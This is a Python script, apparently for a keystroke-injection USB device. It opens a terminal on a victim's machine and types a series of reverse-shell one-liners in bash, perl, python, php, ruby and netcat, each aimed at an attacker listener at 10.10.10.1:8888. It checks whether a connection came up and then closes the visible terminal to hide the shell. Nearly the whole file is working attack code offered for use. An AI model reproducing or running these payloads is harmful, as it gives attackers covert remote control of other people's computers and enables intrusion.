import subprocess
import keyboard_upgraded

def execute(cmd):
    Command=subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,shell=True)
    (out, err)=Command.communicate()
    if err:
        print(err)
        exit(1)
    return out

# function to check out if the reverse connection has been setup or not 10.10.10.3 victim's ip and 8888 our server port
def check():
    if execute('netstat -an | grep tcp | grep 8888 | grep 10.10.10.3'):
        return True
    else:
        return False

#keyboard_upgraded.ard_perm = True
keyboard_upgraded.delay(3000)
keyboard_upgraded.win(False)         # pressing win key to open search
keyboard_upgraded.delay(2000)
keyboard_upgraded.string('Terminal')  # typing terminal in terminal window
keyboard_upgraded.delay(2000)
keyboard_upgraded.string('\n')          # sending enter to begin search for terminal
keyboard_upgraded.delay(2000)
keyboard_upgraded.string('\n')          # selecting the terminal executable
keyboard_upgraded.delay(2000)

# now starts the commands one by one
# our server is listening on 10.10.10.1 8888
def payload_send(payload):
    keyboard_upgraded.string(payload)
    keyboard_upgraded.delay(2000)
    keyboard_upgraded.string('\n')  # executing command

    # checking connectivity for the success of the payload
    res = check()
    return res

payloads =  [

# typing command to open reverse shell using bash interactive mode with stdin,stdout being redirected
'bash -i >& /dev/tcp/10.10.10.1/8888 0>&1',

# using perl
"perl -e 'use Socket;'" + '$i="10.10.10.1";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};',

# using python
"python -c" +  'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);',

# using php
"php -r" + '$sock=fsockopen("10.10.10.1",8888);exec("/bin/sh -i <&3 >&3 2>&3");',

# using ruby
"ruby -rsocket -e" + 'f=TCPSocket.open("10.10.10.1",8888).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)',

# using nc
'nc -e /bin/sh 10.10.10.1 8888'
]

for load in payloads:
    res = payload_send(load)
    if res:
        print 'reverse shell achieved now use this shell to open multiple shells and close the main victim shell'
        keyboard_upgraded.delay(10000)
        keyboard_upgraded.delay(10000)
        keyboard_upgraded.delay(10000) # you have 30 seconds only
        keyboard_upgraded.send(12061)  # sending alt + F4 after 30 seconds to close main shell
        break # breaking out of the loop as we have achieved reverse shell